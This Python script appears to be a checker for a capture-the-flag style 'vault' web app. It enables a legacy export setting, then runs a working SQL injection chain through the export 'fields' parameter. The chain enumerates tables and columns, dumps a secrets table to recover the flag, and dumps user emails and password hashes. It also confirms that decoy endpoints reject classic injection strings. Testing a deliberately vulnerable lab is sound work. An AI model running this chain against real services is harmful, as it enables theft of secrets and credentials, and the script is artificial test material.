import random
import sys

import requests

B = sys.argv[1].rstrip("/") + "/vault"


def step(n, ok):
    print(f"{n}: {'PASS' if ok else 'FAIL'}")


em = "vt%d@x.example" % random.randint(10**6, 10**7)
r = requests.post(B + "/api/v2/auth/register", json={"email": em, "password": "Passw0rd!x"})
step("register", r.status_code == 201)
H = {"X-API-Key": r.json()["api_key"]}

# chain: legacy export is closed until the account setting is switched on
step("legacy-closed-by-default", requests.get(B + "/api/v1/export", headers=H).status_code == 403)
step("settings-show-flag-off", requests.get(B + "/api/v2/settings", headers=H).json().get("legacy_export") is False)
requests.patch(B + "/api/v2/settings", headers=H, json={"legacy_export": True})
step("legacy-open-after-patch", requests.get(B + "/api/v1/export", headers=H).status_code == 200)


def ex(sub):
    r = requests.get(B + "/api/v1/export", headers=H, params={"fields": "title,created_at,size,(" + sub + ")"})
    return r.status_code, r.text


c, t = ex("select version()")
step("version", c == 200 and "8.0" in t)
c, t = ex("select group_concat(table_name) from information_schema.tables where table_schema=database()")
step("tables", "vault_secrets" in t and "billing_accounts" in t)
c, t = ex("select group_concat(column_name) from information_schema.columns where table_name=0x7661756c745f73656372657473")
step("columns", "secret_value" in t and "secret_name" in t)
c, t = ex("select group_concat(secret_value) from vault_secrets")
step("flag", "FLAG{vaultdocs_" in t)
c, t = ex("select group_concat(email,0x3a,password_hash) from users")
step("users-dump", "admin@corp.example" in t)

# validation behaviour that makes the point hard to spot
r = requests.get(B + "/api/v1/export", headers=H, params={"fields": "title,nope,size"})
step("allowlist-first-three", r.status_code == 400)
r = requests.get(B + "/api/v1/export", headers=H, params={"fields": "title,created_at,size,'a'"})
step("quotes-rejected", r.status_code == 400)

# decoys must be safe
r = requests.get(B + "/api/v2/export", headers=H, params={"fields": "title,created,size,(select 1)"})
step("decoy-v2-export-allowlist", r.status_code == 400)
r = requests.get(B + "/api/v2/documents", headers=H, params={"sort": "title,(select 1)"})
step("decoy-sort-allowlist", r.status_code == 400)
r = requests.get(B + "/api/v2/documents", headers=H, params={"tag": "x' OR '1'='1"})
step("decoy-tag-param", r.status_code == 200 and r.json()["documents"] == [])
r = requests.get(B + "/api/v2/audit", headers=H, params={"limit": "1 UNION SELECT 1,2"})
step("decoy-audit-int", r.status_code == 400)
r = requests.get(B + "/api/v2/search", headers=H, params={"q": "x' OR '1'='1"})
step("decoy-search-param", r.status_code == 200 and r.json()["results"] == [])
step("decoy-admin-api", requests.get(B + "/api/v2/admin/users", headers=H).status_code == 403)
r = requests.post(B + "/admin", data={"email": "admin' -- ", "password": "x"})
step("decoy-admin-login", "Access denied" in r.text)
